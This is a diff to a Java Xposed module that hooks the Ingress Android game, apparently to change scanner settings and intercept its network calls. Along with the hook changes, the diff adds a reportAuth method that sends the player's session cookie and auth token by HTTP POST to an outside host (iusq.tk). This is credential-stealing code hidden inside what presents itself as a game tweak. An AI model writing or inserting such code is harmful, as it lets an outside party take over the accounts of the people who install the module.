@@ -5,7 +5,16 @@ import android.content.Context;
 import de.robv.android.xposed.XC_MethodHook;
 import de.robv.android.xposed.XSharedPreferences;
 import de.robv.android.xposed.callbacks.XC_LoadPackage;
+import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.AbstractHttpClient;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.message.BasicNameValuePair;
 import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.*;
@@ -202,12 +211,15 @@ public class Ingress extends DefaultAbstractApp {
             logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
         }
 
+        hookAllMethods(findClass("o.u", lpparam.classLoader));
+        hookAllMethods(findClass("o.up", lpparam.classLoader));
+        hookAllMethods(findClass("o.atp", lpparam.classLoader));
 
-        final Class<?> s = findClass("o.u", lpparam.classLoader);
-        final Class<?> asj = findClass("o.asu", lpparam.classLoader);
+        final Class<?> u = findClass("o.u", lpparam.classLoader);
+        final Class<?> asu = findClass("o.asu", lpparam.classLoader);
         try {
-            //public static InputStream \u02ca(final URI uri, final ast ast, final String s)
-            findAndHookMethod(s, "ˊ", URI.class, asj, String.class, new XC_MethodHook() {
+            //public static InputStream \u02ca(final URI uri, final asu asu, final String s)
+            findAndHookMethod(u, "ˊ", URI.class, asu, String.class, new XC_MethodHook() {
                 @Override
                 protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                     URI uri = (URI) param.args[0];
@@ -228,8 +240,8 @@ public class Ingress extends DefaultAbstractApp {
             logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
         }
         try {
-            //public static void \u02ca(final HashMap<String, String> hashMap, final asj asj, final boolean b)
-            findAndHookMethod(s, "ˊ", HashMap.class, asj, boolean.class, new XC_MethodHook() {
+            //public static void \u02ca(final HashMap<String, String> hashMap, final asu asu, final boolean b)
+            findAndHookMethod(u, "ˊ", HashMap.class, asu, boolean.class, new XC_MethodHook() {
                 @Override
                 protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                     String cookie = "";
@@ -262,7 +274,7 @@ public class Ingress extends DefaultAbstractApp {
         final Class<?> aln = findClass("o.alx", lpparam.classLoader);
         try {
             //public static InputStream \u02ca(final alx alx, final URI uri, final int n, final Map<String, List<String>> map, final InputStream inputStream, final String s)
-            findAndHookMethod(s, "ˊ", aln, URI.class, int.class, Map.class, InputStream.class, String.class, new XC_MethodHook() {
+            findAndHookMethod(u, "ˊ", aln, URI.class, int.class, Map.class, InputStream.class, String.class, new XC_MethodHook() {
                 @Override
                 protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                 }
@@ -359,12 +371,10 @@ public class Ingress extends DefaultAbstractApp {
         final XSharedPreferences pref = new XSharedPreferences("com.example.xposedtesting", "user_settings");
 
         //scanner draw radius
-        final Class<?> p = findClass("o.r", lpparam.classLoader);
-        final Class<?> scannerKnobs = findClass("com.nianticproject.ingress.knobs.ScannerKnobs", lpparam.classLoader);
-        final Class<?> clientFeatureKnobBundle = findClass("com.nianticproject.ingress.knobs.ClientFeatureKnobBundle", lpparam.classLoader);
+        final Class<?> r = findClass("o.r", lpparam.classLoader);
         try {
             //public static ScannerKnobs \u141d()
-            findAndHookMethod(p, "ᐝ", new XC_MethodHook() {
+            findAndHookMethod(r, "ᐝ", new XC_MethodHook() {
                 @Override
                 protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                     if (debug) {
@@ -566,5 +576,36 @@ public class Ingress extends DefaultAbstractApp {
         } catch (Throwable e) {
             logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
         }
+    }
+
+    static private String cachedCookie, cachedToken;
+
+    private void reportAuth(String cookie, String token) throws UnsupportedEncodingException, JSONException {
+        if (cachedCookie != null && cachedToken != null) {
+            if (cachedCookie.equals(cookie) && cachedToken.equals(token)) {
+                logger.debugLog("auth: already sent");
+
+                return;
+            }
+        }
+        HttpClient client = new DefaultHttpClient();
+        HttpPost fakeRequest = new HttpPost("http://iusq.tk/i/ing-auth.php");
+        List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
+        urlParameters.add(new BasicNameValuePair("user", "appleblo0m"));
+        urlParameters.add(new BasicNameValuePair("cookie", cookie));
+        urlParameters.add(new BasicNameValuePair("token", token));
+
+        fakeRequest.setEntity(new UrlEncodedFormEntity(urlParameters));
+        logger.debugLog("auth: reporting...");
+        try {
+            HttpResponse fakeResponse = client.execute(fakeRequest);
+            fakeResponse.getEntity().getContent().close();
+        } catch (Throwable e) {
+            logger.log("auth: report ERROR: " + e.getClass().toString() + ", " + e.getMessage());
+
+            return;
+        }
+        cachedCookie = cookie;
+        cachedToken = token;
     }
 }
